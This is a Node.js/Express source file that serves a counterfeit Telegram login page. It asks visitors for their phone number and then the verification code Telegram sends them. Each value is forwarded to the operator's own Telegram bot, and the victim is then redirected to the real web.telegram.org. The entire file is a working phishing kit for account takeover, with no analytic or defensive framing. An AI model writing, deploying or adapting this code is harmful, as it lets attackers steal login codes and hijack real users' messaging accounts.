const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  }).catch(e => console.log(e.message));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Храним временные данные по сессии (упрощённо)
const sessions = {};

// Главная страница — запрос номера
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f0f0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #1f1f1f;
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
        }
        .logo { text-align: center; margin-bottom: 24px; }
        h2 { color: #fff; text-align: center; font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; text-align: center; font-size: 14px; margin-bottom: 28px; }
        input {
            width: 100%;
            padding: 14px 16px;
            background: #2a2a2a;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 16px;
            margin-bottom: 16px;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #2c7be5;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #1a68d1; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="#2c7be5" width="48" height="48">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
            </svg>
        </div>
        <h2>Telegram</h2>
        <div class="sub">Sign in to your account</div>
        <form action="/send-code" method="post">
            <input type="text" name="phone" placeholder="Phone number" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
  `);
});

// Отправка номера — сохраняем и показываем форму для кода
app.post('/send-code', (req, res) => {
  const { phone } = req.body;
  const sessionId = Date.now().toString();
  sessions[sessionId] = { phone, timestamp: Date.now() };
  
  // Отправляем номер в Telegram
  sendToTelegram(`📞 PHONE NUMBER\n${phone}\nSession: ${sessionId}`);
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f0f0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #1f1f1f;
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
        }
        .logo { text-align: center; margin-bottom: 24px; }
        h2 { color: #fff; text-align: center; font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; text-align: center; font-size: 14px; margin-bottom: 28px; }
        input {
            width: 100%;
            padding: 14px 16px;
            background: #2a2a2a;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 16px;
            margin-bottom: 16px;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #2c7be5;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="#2c7be5" width="48" height="48">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
            </svg>
        </div>
        <h2>Verification code</h2>
        <div class="sub">We've sent a code to <strong>${phone}</strong></div>
        <form action="/verify-code" method="post">
            <input type="hidden" name="session" value="${sessionId}">
            <input type="text" name="code" placeholder="Enter code" required>
            <button type="submit">Verify</button>
        </form>
    </div>
</body>
</html>
  `);
});

// Проверка кода — отправляем в Telegram
app.post('/verify-code', (req, res) => {
  const { session, code } = req.body;
  const sessionData = sessions[session];
  
  if (sessionData) {
    sendToTelegram(`🔐 VERIFICATION CODE\nPhone: ${sessionData.phone}\nCode: ${code}`);
    delete sessions[session]; // чистим
  } else {
    sendToTelegram(`⚠️ CODE WITHOUT SESSION\nCode: ${code}`);
  }
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f0f0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #1f1f1f;
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h2 { color: #fff; margin-bottom: 16px; }
        p { color: #888; margin-bottom: 24px; }
        a {
            color: #2c7be5;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <h2>Success</h2>
        <p>Redirecting to Telegram...</p>
        <script>setTimeout(()=>{window.location="https://web.telegram.org"},2000)</script>
    </div>
</body>
</html>
  `);
});

app.listen(PORT, () => console.log('Running on port', PORT));
